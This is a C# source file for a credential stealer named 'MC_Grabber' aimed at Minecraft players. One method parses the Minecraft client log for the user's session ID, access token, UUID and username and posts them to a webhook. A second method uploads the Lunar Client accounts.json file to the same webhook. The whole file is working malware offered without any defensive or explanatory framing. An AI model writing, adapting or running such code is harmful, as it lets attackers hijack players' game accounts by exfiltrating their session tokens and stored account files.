using System;
using System.IO;
using System.Net;
using System.Collections.Specialized;

namespace MC_Grabber
{
    internal class Grab
    {
        public string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public string user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        public NameValueCollection datacollection = new NameValueCollection();
        internal void Minecraft(string webhookurl)
        {
            string SessionID = "";
            string token = "";
            string uuid = "";
            string username = "";
            string path = appdata + "\\.minecraft\\logs\\latest.log";
            string[] content = File.ReadAllText(path).Split('\n');
            foreach (string line in content)
            {
                if (line.ToLower().Contains("user"))
                {
                    username = line.Substring(line.LastIndexOf(':') + 2); // +2 To Remove The ":" & " " Chars From The Username
                }
                if (line.ToLower().Contains("token"))
                {
                    SessionID = line.Substring(line.LastIndexOf('(') + 1).Replace("Session ID is token:", "").Replace(")", ""); // +1 To Remove The "(" Char From The String
                    token = SessionID.Remove(SessionID.LastIndexOf(':'));
                    uuid = SessionID.Substring(SessionID.LastIndexOf(':') + 1).Replace(")", ""); // +1 To Remove The ":" Char From The UUID
                }
            }
            datacollection.Add("content", $"```--> Minecraft Grab Results <--```**Session ID : **`{SessionID}`\n**Username : **`{username}`\n**UUID : **`{uuid}`\n**Access Token : **`{token}`\n\n```--> Lunar Grab Results <--```");
            using (WebClient client = new WebClient())
            {
                client.UploadValues(webhookurl, "POST", datacollection);
            }
        }


        internal void Lunar(string webhookurl)
        {
            string path = user + "\\.lunarclient\\settings\\game\\accounts.json";
            using (WebClient client = new WebClient())
            {
                client.UploadFile(webhookurl, "POST", path);
            }
        }
    }
}
